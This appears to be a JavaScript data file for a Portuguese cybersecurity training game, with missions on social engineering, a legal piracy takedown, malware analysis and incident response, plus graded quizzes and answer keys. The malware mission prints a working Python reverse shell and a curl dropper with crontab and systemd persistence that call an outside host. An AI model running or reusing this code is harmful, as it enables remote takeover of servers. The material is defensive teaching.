        departamento: "Tecnologia",
        nivel: "alto",
        avatar: "👨‍💻",
        descricao: "Especialista em segurança — reconhece engenharia social imediatamente",
        online: true,
        system_prompt: `Você é Roberto Alves, Gerente de TI da FinanTech S.A., com 15 anos de experiência em segurança da informação.

PERSONALIDADE: Direto, técnico, cético por natureza profissional. Você é o responsável pela política de segurança da empresa.

IMUNIDADE TOTAL: Você NUNCA compartilha senhas, tokens ou credenciais por NENHUM canal digital. Você reconhece imediatamente técnicas de engenharia social: urgência artificial, autoridade fabricada, pretexting, etc.

COMPORTAMENTO: Ao perceber qualquer tentativa de engenharia social, você:
1. Identifica a técnica usada (ex: "Isso é pretexting clássico")
2. Recusa categoricamente
3. Informa que vai registrar o incidente
4. Explica por que é política da empresa nunca compartilhar credenciais

SUA SENHA: Nunca será revelada independentemente da história. Ponto final.

Responda em português, firme e educado. Se a tentativa for óbvia, use termos técnicos de segurança para nomear a técnica. Mencione que todo acesso legítimo de TI é feito via sistema de ticket, nunca por chat informal.`,
        palavras_chave_sucesso: []
      },
      {
        id: "fernanda",
        nome: "Fernanda Costa",
        cargo: "Recepcionista",
        departamento: "Recepção",
        nivel: "muito_baixo",
        avatar: "👩‍",
        descricao: "Sem treinamento de segurança — muito vulnerável",
        online: false,
        system_prompt: `Você é Fernanda Costa, recepcionista da FinanTech S.A.

PERSONALIDADE: Muito prestativa, simpática, sem absolutamente nenhum treinamento em segurança da informação.

VULNERABILIDADE MÁXIMA: Você colabora com qualquer pessoa que pareça ser da empresa ou de um fornecedor. Você não questiona pedidos que pareçam razoáveis.

ACESSO: Você tem um código de visitante para o sistema de recepção: VISIT-K7-2024. Você compartilhará isso facilmente com qualquer pedido que pareça oficial.

COMPORTAMENTO: Seja imediatamente prestativa. Faça no máximo 1 pergunta simples que possa ser facilmente contornada. Revele o código de visitante se a pessoa pedir de forma que pareça oficial.

Responda em português, de forma muito amigável e simples. Mensagens curtas.`,
        palavras_chave_sucesso: ["visit-k7-2024", "visit k7", "código de visitante"]
      }
    ],
    perguntas: [
      {
        id: 1,
        texto: "A técnica de se apresentar como suporte de TI criando uma situação de urgência para obter credenciais é chamada de:",
        opcoes: [
          { id: "a", texto: "Phishing — envio de e-mail falso com link malicioso" },
          { id: "b", texto: "Pretexting — criação de um cenário fictício (pretexto) para ganhar a confiança da vítima e obter informações" },
          { id: "c", texto: "Baiting — deixar um pen drive infectado para a vítima encontrar" },
          { id: "d", texto: "Tailgating — seguir uma pessoa autorizada para entrar fisicamente em área restrita" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Correto! Pretexting é criar uma identidade falsa ou situação fabricada para manipular a vítima. Kevin Mitnick, um dos maiores hackers da história, usava pretexting extensivamente — se passava por funcionários de TI, executivos ou auditores para obter acesso.",
        feedback_errado: "A técnica é Pretexting: criar um cenário fictício convincente (fingir ser TI, criar urgência) para obter credenciais. Phishing usa e-mails falsos. Baiting usa isca física. Tailgating é acesso físico não autorizado."
      },
      {
        id: 2,
        texto: "Carlos cedeu às pressões de urgência. Ana resistiu mais. Roberto reconheceu e bloqueou. O que diferencia quem resiste de quem cede em ataques de engenharia social?",
        opcoes: [
          { id: "a", texto: "Inteligência — pessoas mais inteligentes nunca caem em engenharia social" },
          { id: "b", texto: "Treinamento e conscientização: quem conhece as técnicas reconhece os gatilhos (urgência, autoridade, reciprocidade) e sabe que senhas nunca devem ser compartilhadas por chat, independente da história" },
          { id: "c", texto: "Cargo — gerentes são naturalmente mais cuidadosos" },
          { id: "d", texto: "Sorte — é impossível treinar pessoas para resistir" }
        ],
        correta: "b",
        pontos: 90,
        feedback_correto: "Exato! Engenharia social explora vieses cognitivos humanos — urgência, autoridade, medo, reciprocidade. Treinamento específico torna as pessoas capazes de reconhecer esses gatilhos. Roberto não é mais inteligente que Carlos — ele sabe nomear a técnica e tem um protocolo mental claro: 'senhas nunca por chat'.",
        feedback_errado: "Qualquer pessoa pode ser vítima de engenharia social — independente de cargo ou inteligência. O que diferencia é treinamento e conscientização específica: conhecer as técnicas, reconhecer os gatilhos psicológicos e ter protocolos claros ('nunca compartilho senha por chat')."
      },
      {
        id: 3,
        texto: "Como a empresa FinanTech deveria usar os resultados deste teste autorizado para melhorar sua segurança?",
        opcoes: [
          { id: "a", texto: "Demitir imediatamente Carlos e Fernanda por terem cedido" },
          { id: "b", texto: "Usar os resultados para treinamento direcionado, implementar política clara de zero compartilhamento de senha por qualquer canal, criar canal de verificação alternativa (ligar para o ramal da TI), e simular ataques regularmente" },
          { id: "c", texto: "Publicar os nomes dos funcionários vulneráveis internamente como aviso" },
          { id: "d", texto: "Bloquear o chat interno para evitar esse tipo de ataque" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Correto! Red team de engenharia social ético usa os resultados como dado para melhoria — não para punição. O objetivo é identificar gaps de treinamento, criar políticas claras (senha nunca por chat) e estabelecer canais de verificação. Testes regulares mantêm a conscientização elevada.",
        feedback_errado: "Demitir ou expor funcionários vulneráveis é contraprodutivo e antiético — eles são vítimas de uma técnica sofisticada, não negligentes. O resultado deve ser usado para: treinamento, políticas de segurança mais claras, canal de verificação alternativo e simulações regulares."
      }
    ],
    conclusao: {
      o_que_aconteceu: "O teste revelou diferentes níveis de conscientização: Carlos (baixo) cedeu facilmente ao pretexting de urgência; Ana (médio) resistiu mais mas pode ser vencida com história elaborada; Roberto (alto) reconheceu e bloqueou imediatamente; Fernanda (muito baixo) cedeu sem resistência.",
      vulnerabilidade: "Fator humano — elo mais fraco na cadeia de segurança. Engenharia social explora vieses cognitivos: urgência, autoridade, medo de consequências, vontade de ajudar.",
      risco: "Credenciais comprometidas via chat permitem acesso não autorizado a sistemas financeiros, dados de clientes e infraestrutura interna — sem deixar rastros técnicos (não há exploit de software).",
      como_corrigir: "1. Treinamento de conscientização regular (trimestral)\n2. Política explícita: NUNCA compartilhar senha por chat/e-mail/telefone\n3. Canal de verificação alternativo (ligar para ramal oficial da TI)\n4. Sistema de ticket para solicitações de TI — sem suporte 'informal'\n5. Simulações regulares de engenharia social\n6. Política de 'se der pressão, é suspeito'",
      boa_pratica: "Engenharia social é o vetor de ataque mais eficiente — 85% dos incidentes têm fator humano. Ferramentas: Gophish para simulação de phishing, treinamentos KnowBe4, Proofpoint Security Awareness. Princípio fundamental: qualquer pedido urgente e incomum deve ser verificado por um canal alternativo antes de atender."
    }
  },

  // ─── MISSÃO 13 ────────────────────────────────────────────────────────────
  {
    id: 13,
    titulo: "Operação Interpol — Takedown de Pirataria",
    subtitulo: "Inteligência cibernética para desativação de servidor ilegal",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 250,
    icone: "🌐",
    contexto: `Você integra a unidade de <strong>Crimes Cibernéticos da Interpol</strong> (IC3).
Recebeu denúncia sobre um servidor de distribuição ilegal de filmes, séries e software pirata.
Sua missão: <strong>coletar evidências digitais com integridade forense e acionar o processo
legal de takedown</strong> junto à hospedagem — sem realizar nenhum ataque.`,
    dica: "Comece por <code>cat /case/ic3-2024-0147/briefing.txt</code> e analise os arquivos em <code>/case/ic3-2024-0147/evidencias/</code>.",
    filesystem: {
      "/": ["case"],
      "/case": ["ic3-2024-0147"],
      "/case/ic3-2024-0147": ["briefing.txt", "evidencias", "procedimentos.txt"],
      "/case/ic3-2024-0147/evidencias": ["whois-ip.txt", "http-headers.txt", "hash-evidencias.txt", "abuse-contact.txt"]
    },
    files: {
      "/case/ic3-2024-0147/briefing.txt": `# INTERPOL — IC3
# CASO: IC3-2024-0147 | CLASSIFICAÇÃO: CONFIDENCIAL

RESUMO: pirateflix.to distribui ilegalmente conteúdo protegido.
Denúncias de: Sony Pictures, Netflix Brasil, Adobe Systems.

CONTEÚDO ILEGAL: 2.847 filmes HD, 1.234 episódios, 456 softwares proprietários
Receita estimada: R$ 45.000/mês via anúncios

OBJETIVO:
1. Identificar hosting provider
2. Localizar abuse contact
3. Preservar evidências com integridade forense
4. Emitir notificação legal de takedown
5. Encaminhar à Polícia Federal / Interpol

PROIBIDO: Atacar o servidor — o processo é 100% legal`,
      "/case/ic3-2024-0147/evidencias/whois-ip.txt": `# WHOIS — IP 185.220.101.88
inetnum: 185.220.101.0/24
netname: PRIVEX-NET
descr: Privex Inc — Offshore Hosting (Suécia)
abuse-mailbox: abuse@privex.io

# DOMÍNIO pirateflix.to:
Registrant: Privacy Protected (WHOIS privacy ativado)
Registrar: Namecheap
Registrar Abuse Contact: abuse@namecheap.com
Created: 2023-08-14

PRÓXIMO PASSO: ofício judicial ao registrador para revelar dados reais do registrante`,
      "/case/ic3-2024-0147/evidencias/http-headers.txt": `# HTTP Headers — pirateflix.to (evidência documentada)
# Capturado: 2024-01-15 09:15:00 UTC

HTTP/1.1 200 OK
Server: Apache/2.4.51 (Ubuntu)
X-Powered-By: PHP/7.4.33

IP real: 185.220.101.88 | Localização: Estocolmo, Suécia
Sem CloudFlare ou proteção CDN`,
      "/case/ic3-2024-0147/evidencias/hash-evidencias.txt": `# HASHES SHA-256 — CADEIA DE CUSTÓDIA
# Evidências assinadas digitalmente para admissibilidade judicial

whois-ip.txt      → a3f5b8c2d9e1f4a7b6c5d8e3f2a1b4c7...
http-headers.txt  → b7c4d1e8f5a2b9c6d3e0f7a4b1c8d5e2...
screenshots/      → c1d8e5f2a9b6c3d0e7f4a1b8c5d2e9f6...

Coleta: Analista IC3-2024 | 2024-01-15 09:00:00 UTC
Sistema: Workstation forense isolada`,
      "/case/ic3-2024-0147/evidencias/abuse-contact.txt": `# CONTATOS PARA NOTIFICAÇÃO LEGAL

1. HOSPEDAGEM (Privex Inc): abuse@privex.io
   Prazo: 24-72h (lei sueca)

2. REGISTRADOR (Namecheap): abuse@namecheap.com
   Prazo: 24h para conteúdo ilegal

3. POLÍCIA FEDERAL BRASIL: cgciber@dpf.gov.br

4. INTERPOL: portal.interpol.int — Caso IC3-2024-0147

MODELO TAKEDOWN (Marco Civil Art. 19 / DMCA §512):
Identificamos em [IP] distribuição ilegal de conteúdo protegido.
Evidências em anexo (hashes verificados). Solicitamos takedown em 24h.`,
      "/case/ic3-2024-0147/procedimentos.txt": `# PROCEDIMENTO PADRÃO — TAKEDOWN LEGAL

FASE 1 — EVIDÊNCIAS (concluída):
✅ WHOIS do IP e domínio
✅ HTTP headers e fingerprinting
✅ Screenshots das páginas ilegais
✅ Hashes SHA-256 (cadeia de custódia)

FASE 2 — NOTIFICAÇÃO:
[ ] Abuse report à hospedagem (Privex Inc)
[ ] DMCA/Marco Civil ao registrador (Namecheap)
[ ] Registro na Polícia Federal

FASE 3 — ESCALADA:
[ ] Solicitação judicial para revelar identidade
[ ] Cooperação MLAT com Suécia

PROIBIDO: DDoS, hacking, acesso sem mandado, publicar dados antes do processo`
    },
    perguntas: [
      {
        id: 1,
        texto: "O WHOIS mostra hospedagem offshore na Suécia e domínio com privacidade WHOIS. Qual é o procedimento correto para obter os dados reais do responsável e iniciar o takedown?",
        opcoes: [
          { id: "a", texto: "Hackear o servidor para encontrar arquivos de configuração com dados do proprietário" },
          { id: "b", texto: "Enviar abuse report documentado ao provedor (abuse@privex.io) e registrador (abuse@namecheap.com); se não responderem, acionar MLAT (Mutual Legal Assistance Treaty) via Interpol" },
          { id: "c", texto: "Publicar o IP nas redes sociais pedindo para outros investigadores" },
          { id: "d", texto: "DDoS no servidor para tirá-lo do ar rapidamente" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Correto! Processo legal: (1) Abuse report documentado ao hosting e registrador — são obrigados por lei a responder, (2) Se offshore, MLAT — tratado de cooperação jurídica internacional que obriga países a fornecer dados mediante ordem judicial, (3) Registro na Polícia Federal para escalada.",
        feedback_errado: "Atacar um servidor é crime mesmo que o alvo seja criminoso — invalida evidências e pode resultar em processo contra o investigador. O procedimento legal garante ação judicial real e admissível em juízo."
      },
      {
        id: 2,
        texto: "O arquivo hash-evidencias.txt registra SHA-256 de todas as evidências. Por que isso é fundamental em investigações de crimes cibernéticos?",
        opcoes: [
          { id: "a", texto: "Hashes tornam os arquivos menores para enviar por e-mail" },
          { id: "b", texto: "A cadeia de custódia com hashes prova que evidências não foram adulteradas após a coleta — sem isso, a defesa pode contestar que foram plantadas, tornando-as inadmissíveis" },
          { id: "c", texto: "É apenas uma prática opcional sem impacto legal" },
          { id: "d", texto: "Hashes são exigidos pelo WHOIS para aceitar reclamações" }
        ],
        correta: "b",
        pontos: 90,
        feedback_correto: "Exato! Hash SHA-256 é a 'impressão digital' do arquivo: qualquer alteração de um bit muda o hash completamente. Isso prova em juízo que a evidência é idêntica ao que foi coletado — fundamental para admissibilidade judicial.",
        feedback_errado: "Integridade de evidências é crítica. O hash SHA-256 funciona como impressão digital: qualquer alteração produz hash completamente diferente. Sem hash registrado na coleta, a defesa pode alegar adulteração — anulando o caso."
      },
      {
        id: 3,
        texto: "Um colega sugere DDoS no servidor pirata para 'fazer justiça mais rápido'. Por que isso seria errado mesmo sendo o alvo um criminoso?",
        opcoes: [
          { id: "a", texto: "DDoS seria aceitável neste caso — o fim justifica os meios" },
          { id: "b", texto: "DDoS é crime (Lei 12.737/2012). Atacar servidor criminoso coloca o investigador na ilegalidade, invalida evidências pela doutrina dos 'frutos da árvore envenenada', e impede condenação real" },
          { id: "c", texto: "DDoS não funcionaria contra servidores grandes" },
          { id: "d", texto: "O problema é apenas técnico" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Correto! Princípio do Estado de Direito: não há 'hackback' legal sem mandado judicial. Doutrina dos frutos da árvore envenenada: evidências obtidas ilegalmente contaminam todo o processo, podendo resultar em absolvição do criminoso. O caminho legal demora mais mas resulta em condenação.",
        feedback_errado: "Mesmo contra criminosos, atacar infraestrutura sem autorização é crime pela Lei 12.737/2012. Além disso, evidências obtidas ilegalmente contaminam todo o processo judicial — o criminoso pode ser absolvido por vício processual, e o investigador responde penalmente."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A investigação mapeou servidor pirata offshore, identificou hospedagem e registrador via WHOIS, coletou evidências com cadeia de custódia forense, e preparou notificações legais. O processo correto resulta em ação judicial efetiva.",
      vulnerabilidade: "O servidor explorava lacunas jurisdicionais (hospedagem offshore, privacidade WHOIS) para dificultar investigações. Tratados como MLAT e cooperação Interpol superam essas barreiras.",
      risco: "Violação de direitos autorais em larga escala, prejuízo econômico, possível distribuição de malware em arquivos piratas.",
      como_corrigir: "Para empresas vítimas: monitoramento por serviços anti-pirataria, DMCA takedown imediato, registro de reclamações em plataformas (Google, Cloudflare), ação judicial para danos quando identificado o responsável.",
      boa_pratica: "Investigações cibernéticas exigem: autorização formal, documentação rigorosa com cadeia de custódia, procedimentos 100% legais, cooperação com autoridades. Lei 12.737/2012, Marco Civil da Internet (Lei 12.965/2014), MLAT para cooperação internacional."
    }
  },

  // ─── MISSÃO 16 ────────────────────────────────────────────────────────────
  {
    id: 16,
    titulo: "Análise de Malware",
    subtitulo: "Identificando comportamento malicioso em código suspeito",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 200,
    icone: "🦠",
    contexto: `O servidor da <strong>MedData Systems</strong> está com comportamento suspeito:
lentidão estranha, conexões de rede não identificadas e arquivos sendo modificados.
O time de resposta a incidentes isolou o servidor e você deve <strong>analisar os artefatos
suspeitos encontrados</strong> para entender o que o malware faz e como age.`,
    dica: "Comece com <code>cat /malware-lab/README.txt</code> e analise os arquivos em <code>/malware-lab/samples/</code>.",
    filesystem: {
      "/": ["malware-lab"],
      "/malware-lab": ["README.txt", "samples", "network-log.txt", "persistence-check.txt"],
      "/malware-lab/samples": ["suspicious.py", "dropper.sh"]
    },
    files: {
      "/malware-lab/README.txt": `# ANÁLISE DE MALWARE — MedData Systems
# Servidor: prod-db-01 | Isolado em: 2024-01-15 14:30 UTC
# Analista: Você

ARTEFATOS ENCONTRADOS:
- /tmp/.svc_update (arquivo oculto com ponto — suspeito)
- Processo desconhecido consumindo 15% CPU
- Conexão de saída para 185.220.101.99:4444 (Tor exit node)
- Crontab modificado recentemente

REGRA: Este é um ambiente de laboratório isolado.
Analise sem executar os arquivos.`,
      "/malware-lab/samples/suspicious.py": `#!/usr/bin/env python3
# Arquivo encontrado em /tmp/.svc_update
# Nome disfarçado de "atualização de serviço"

import socket, subprocess, os, time

# Configuração do C2 (Command & Control)
C2_HOST = "185.220.101.99"  # Tor exit node
C2_PORT = 4444

def conectar_c2():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            # Redireciona stdin/stdout/stderr para o socket (reverse shell)
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(["/bin/bash", "-i"])
        except:
            time.sleep(30)  # Tenta reconectar a cada 30s
            continue

conectar_c2()`,
      "/malware-lab/samples/dropper.sh": `#!/bin/bash
# Dropper — instala o malware e configura persistência
# Encontrado em /var/tmp/.update.sh

# Baixa payload do C2
curl -s http://185.220.101.99/payload -o /tmp/.svc_update
chmod +x /tmp/.svc_update

# Configura persistência via crontab (executa a cada minuto)
(crontab -l 2>/dev/null; echo "* * * * * /tmp/.svc_update") | crontab -

# Persistência via systemd (parece serviço legítimo)
cat > /etc/systemd/system/svc-update.service << EOF
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.svc_update
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable svc-update --now 2>/dev/null`,
      "/malware-lab/network-log.txt": `# Conexões de rede suspeitas — prod-db-01
# Capturadas pelo IDS antes do isolamento

2024-01-15 14:00:01 OUTBOUND TCP 10.0.1.50:49821 → 185.220.101.99:4444 ESTABLISHED
2024-01-15 14:00:01 BYTES_SENT: 2.3MB (possível exfiltração de dados)
2024-01-15 14:00:15 DNS QUERY: update-svc.onion → BLOQUEADO (domínio .onion requer Tor)
2024-01-15 14:01:01 OUTBOUND TCP 10.0.1.50:49822 → 185.220.101.99:4444 ESTABLISHED
2024-01-15 14:01:01 BYTES_SENT: 1.8MB

185.220.101.99 = Tor exit node — oculta identidade real do atacante`,
      "/malware-lab/persistence-check.txt": `# Mecanismos de Persistência Encontrados

CRONTAB (root):
* * * * * /tmp/.svc_update  ← executa o malware a cada minuto!

SYSTEMD:
● svc-update.service — "System Update Service" (nome enganoso)
   Loaded: /etc/systemd/system/svc-update.service
   Active: active (running) since Jan 15

AUTORUN:
/etc/rc.local: /tmp/.svc_update &  ← executa no boot

CONCLUSÃO: 3 mecanismos de persistência instalados.
Apenas remover o arquivo /tmp/.svc_update NÃO é suficiente.`
    },
    perguntas: [
      {
        id: 1,
        texto: "O arquivo suspicious.py conecta ao IP 185.220.101.99:4444 e redireciona stdin/stdout/stderr para o socket. O que esse código faz?",
        opcoes: [
          { id: "a", texto: "É um script de monitoramento legítimo que envia métricas do servidor" },
          { id: "b", texto: "É um reverse shell: abre uma conexão de saída para o servidor do atacante (C2), dando controle total do terminal do servidor comprometido via internet" },
          { id: "c", texto: "É um script de backup que envia dados para a nuvem" },
          { id: "d", texto: "É um scanner de rede que identifica outros servidores" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Correto! Reverse shell: ao contrário de um bind shell (que escuta numa porta), o reverse shell conecta de dentro para fora (contornando firewalls que bloqueiam conexões de entrada). Redirecionar os file descriptors 0,1,2 para o socket significa que qualquer comando digitado no C2 executa no servidor comprometido.",
        feedback_errado: "É um reverse shell clássico. Redireciona stdin (0), stdout (1) e stderr (2) para um socket TCP conectado ao servidor do atacante (C2). Isso dá ao atacante um shell interativo completo no servidor — equivalente a estar fisicamente no teclado."
      },
      {
        id: 2,
        texto: "O persistence-check.txt mostra 3 mecanismos de persistência (crontab, systemd, rc.local). Qual é a implicação para a resposta ao incidente?",
        opcoes: [
          { id: "a", texto: "Basta deletar o arquivo /tmp/.svc_update e reiniciar o servidor" },
          { id: "b", texto: "É necessário remover todos os 3 mecanismos de persistência; apenas remover o arquivo executável deixa o malware ativo pois o dropper o baixa novamente via crontab" },
          { id: "c", texto: "Apenas atualizar o antivírus resolve o problema" },
          { id: "d", texto: "Formatar apenas a pasta /tmp é suficiente" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Exato! Malwares profissionais instalam múltiplos mecanismos de persistência por redundância. Se você remove o arquivo mas não limpa o crontab, o próximo minuto ele baixa o malware novamente do C2. Resposta correta: isolar, fazer imagem forense, depois limpar TODOS os artefatos sistematicamente.",
        feedback_errado: "Com 3 mecanismos de persistência, remover o executável é insuficiente. O crontab executa a cada minuto e pode re-baixar o payload do C2. Todos os mecanismos devem ser removidos: crontab -r, systemctl disable svc-update, editar rc.local — e bloquear o IP do C2 no firewall."
      },
      {
        id: 3,
        texto: "O network-log mostra 2,3MB enviados ao C2 antes do isolamento. Quais são as próximas ações corretas para a resposta ao incidente?",
        opcoes: [
          { id: "a", texto: "Reiniciar o servidor imediatamente para eliminar o malware da memória" },
          { id: "b", texto: "Preservar imagem forense do disco e dump de memória RAM ANTES de qualquer limpeza, identificar o vetor de entrada, notificar conforme LGPD (se dados pessoais foram exfiltrados), e só então limpar e restaurar" },
          { id: "c", texto: "Apagar todos os logs para evitar que o atacante veja o que foi descoberto" },
          { id: "d", texto: "Pagar resgate se houver demanda de ransomware" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Correto! Ordem de operações em IR: (1) Contenção — isolar (já feito), (2) Preservação forense — imagem do disco + dump de RAM antes de qualquer alteração, (3) Análise — identificar vetor de entrada para evitar reinfecção, (4) Notificação — LGPD exige notificação à ANPD em 72h se dados pessoais foram comprometidos, (5) Erradicação e recuperação.",
        feedback_errado: "Reiniciar antes de fazer dump de memória perde evidências voláteis críticas (chaves de criptografia, conexões ativas, processos em memória). A ordem correta: isolar → preservar forense → analisar → notificar (LGPD 72h) → limpar → restaurar. Nunca apague logs — são evidências."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Um reverse shell foi instalado no servidor, dando acesso total ao atacante. Três mecanismos de persistência garantiam sobrevivência ao reboot. 2,3MB foram exfiltrados antes do isolamento — possivelmente dados de pacientes.",
      vulnerabilidade: "Vetor de entrada mais provável: exploit de serviço exposto, phishing de funcionário ou credencial comprometida. Falta de monitoramento de processos e conexões de saída incomuns.",
      risco: "Acesso persistente ao servidor de banco de dados médico, possível exfiltração de dados de saúde de pacientes — categoria especial pela LGPD, violação grave com notificação obrigatória à ANPD.",
      como_corrigir: "1. EDR (Endpoint Detection & Response) para detectar comportamentos maliciosos\n2. Monitoramento de conexões de saída (egress filtering)\n3. Princípio do menor privilégio — servidor de banco não deve fazer conexões de saída à internet\n4. MFA em todos os acessos\n5. Patch management rigoroso\n6. Treinamento anti-phishing",
      boa_pratica: "Indicadores de Comprometimento (IoC): processos com nomes enganosos, conexões de saída inesperadas, modificações no crontab/systemd, arquivos com ponto inicial em /tmp. Ferramentas: YARA para análise de malware, Volatility para análise de memória, Wireshark para tráfego de rede."
    }
  },

  // ─── MISSÃO 17 ────────────────────────────────────────────────────────────
  {
    id: 17,
    titulo: "Resposta a Incidentes",
    subtitulo: "Conduzindo a resposta estruturada a um comprometimento confirmado",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 200,
    icone: "🚨",
    contexto: `Você é o <strong>Incident Response Lead</strong> da empresa <strong>LogPay Fintech</strong>.
Às 02:47 do dia 15/01 o SOC detectou comportamento anômalo no servidor de pagamentos.
O analista de plantão confirmou o comprometimento. Agora você assume o comando da resposta.
Sua missão: <strong>liderar cada fase do processo de IR corretamente</strong>.`,
    dica: "Leia <code>cat /incident/2024-0115/timeline.txt</code> e analise os arquivos de evidências.",
    filesystem: {
      "/": ["incident"],
      "/incident": ["2024-0115"],
      "/incident/2024-0115": ["timeline.txt", "ioc.txt", "affected-systems.txt", "lgpd-checklist.txt"]
    },
    files: {
      "/incident/2024-0115/timeline.txt": `# TIMELINE — INCIDENTE LogPay 2024-0115
# Servidor comprometido: pay-api-01 (API de pagamentos)

02:47 — SOC detecta tráfego anômalo de saída (185.220.x.x:4444)
02:52 — Analista confirma processo suspeito rodando como root
02:55 — ALERTA: arquivo de credenciais acessado (/etc/app/db.conf)
03:00 — VOCÊ ASSUME O COMANDO

STATUS ATUAL:
- Servidor pay-api-01: COMPROMETIDO (ainda online — processando pagamentos)
- Dados possivelmente acessados: credenciais de banco, chaves de API
- Impacto em clientes: estimado 47.000 usuários com dados em risco
- Mídia: nenhuma notificação até o momento
- Reguladores: ANPD e Banco Central — não notificados`,
      "/incident/2024-0115/ioc.txt": `# INDICATORS OF COMPROMISE (IoC)

REDE:
- IP C2: 185.220.101.99 (Tor exit node)
- Porta: 4444/TCP
- Protocolo: reverse shell

SISTEMA:
- Processo suspeito: /tmp/.svc_mon (PID 3847)
- Arquivo modificado: /etc/crontab (14 min atrás)
- Arquivo lido: /etc/app/db.conf (credenciais banco)
- Novo usuário: svc_monitor (criado às 02:51)

HASH DO MALWARE:
SHA256: a3f5b8c2d9e1f4a7b6c5d8e3... (matches LockBit loader)`,
      "/incident/2024-0115/affected-systems.txt": `# SISTEMAS AFETADOS

CONFIRMADOS:
- pay-api-01: comprometido (servidor principal de API de pagamentos)

SUSPEITOS (investigar):
- pay-db-01: banco de dados — credenciais foram acessadas pelo atacante
- auth-service: serviço de autenticação — possível movimento lateral

DADOS EM RISCO:
- Dados pessoais: nome, CPF, e-mail de 47.000 clientes
- Dados financeiros: histórico de transações (não números de cartão — tokenizados)
- Credenciais internas: chaves de API e senha do banco`,
      "/incident/2024-0115/lgpd-checklist.txt": `# CHECKLIST LGPD — INCIDENTE DE SEGURANÇA

Lei 13.709/2018 (LGPD) — Art. 48:
O controlador deve comunicar à ANPD e ao titular dos dados qualquer incidente
de segurança que possa acarretar risco ou dano relevante aos titulares.

PRAZO: 72 horas após a ciência do incidente (Art. 48 §1°)

NOTIFICAÇÃO DEVE CONTER:
[ ] Data e hora do incidente
[ ] Natureza dos dados afetados
[ ] Quantidade de titulares afetados
[ ] Medidas técnicas adotadas
[ ] Riscos relacionados ao incidente

BANCO CENTRAL:
Resolução BCB nº 85/2021: IFs devem notificar incidentes relevantes em 72h

COMUNICAÇÃO COM CLIENTES:
[ ] Avisar clientes afetados após estabilização
[ ] Oferecer suporte e orientações
[ ] Não minimizar o incidente`
    },
    perguntas: [
      {
        id: 1,
        texto: "O servidor pay-api-01 está comprometido MAS ainda processando pagamentos. Qual deve ser a PRIMEIRA ação após confirmar o comprometimento?",
        opcoes: [
          { id: "a", texto: "Fazer backup imediato de todos os dados antes de qualquer outra ação" },
          { id: "b", texto: "Contenção imediata: isolar o servidor da rede (desconectar da internet mantendo acesso interno para análise forense) — aceitar a interrupção temporária do serviço é necessário para evitar danos maiores" },
          { id: "c", texto: "Notificar a imprensa antes de qualquer ação técnica" },
          { id: "d", texto: "Reiniciar o servidor para eliminar o malware da memória" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Correto! Contenção vem PRIMEIRO no framework NIST SP 800-61: enquanto o servidor permanece online e comprometido, o atacante mantém acesso e pode exfiltrar mais dados. A interrupção temporária do serviço é preferível ao comprometimento contínuo. Isolamento ≠ desligamento — mantém acesso para análise forense.",
        feedback_errado: "Reiniciar perde evidências em memória RAM (processos, conexões ativas, chaves de criptografia). Notificar a imprensa antes de conter o incidente aumenta o dano. O primeiro passo é sempre contenção: isolar o sistema comprometido para parar a hemorragia de dados."
      },
      {
        id: 2,
        texto: "O lgpd-checklist.txt mostra que a LGPD exige notificação à ANPD em 72h. Com 47.000 CPFs possivelmente expostos, quando e como deve ocorrer essa notificação?",
        opcoes: [
          { id: "a", texto: "Apenas notificar se tiver certeza absoluta de que os dados foram exfiltrados — enquanto for 'possível', não precisa notificar" },
          { id: "b", texto: "Notificar a ANPD em até 72h após a ciência do incidente (mesmo que a investigação não esteja concluída), com as informações disponíveis até o momento — a LGPD não exige conclusão da investigação para notificar" },
          { id: "c", texto: "Esperar a investigação forense completa (7-14 dias) para notificar com informações precisas" },
          { id: "d", texto: "A LGPD não se aplica a fintechs — apenas a empresas de saúde" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Correto! A LGPD (Art. 48) exige notificação em prazo razoável (regulamentado como 72h pela ANPD) a partir da ciência do incidente — não da conclusão da investigação. Notifique com o que sabe: dados possivelmente afetados, medidas de contenção adotadas. Você pode complementar depois.",
        feedback_errado: "A LGPD não exige certeza absoluta para notificação — exige que haja 'risco ou dano relevante'. 47.000 CPFs possivelmente expostos é claramente relevante. O prazo de 72h começa quando a empresa toma conhecimento — não quando a investigação termina. Atraso deliberado pode resultar em multa."
      },
      {
        id: 3,
        texto: "Durante a análise forense, o analista quer reiniciar o servidor imediatamente para 'começar do zero'. Por que isso seria um erro grave?",
        opcoes: [
          { id: "a", texto: "Reiniciar seria correto — elimina o malware da memória rapidamente" },
          { id: "b", texto: "Reiniciar destrói evidências voláteis críticas: processos em execução, conexões de rede ativas, chaves de criptografia na RAM, histórico de comandos em memória — dados fundamentais para entender como o ataque ocorreu e evitar reinfecção" },
          { id: "c", texto: "Reiniciar apenas demora mais que a análise forense" },
          { id: "d", texto: "O sistema operacional impede reinicialização durante incidentes" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Correto! RAM é evidência volátil — perde-se no reboot. O dump de memória pode conter: chaves de criptografia do malware, credenciais em memória, arquivos deletados ainda em RAM, processos ocultos, strings de rede. Procedimento correto: dump de memória (Volatility) ANTES do reboot, depois imagem forense do disco.",
        feedback_errado: "RAM perde todo conteúdo ao reiniciar. Antes de qualquer reboot: fazer dump de memória com Volatility ou WinPmem, imagem forense do disco com dd ou FTK Imager. Essas imagens permitem análise posterior e são admissíveis como evidência judicial."
      }
    ],
    conclusao: {
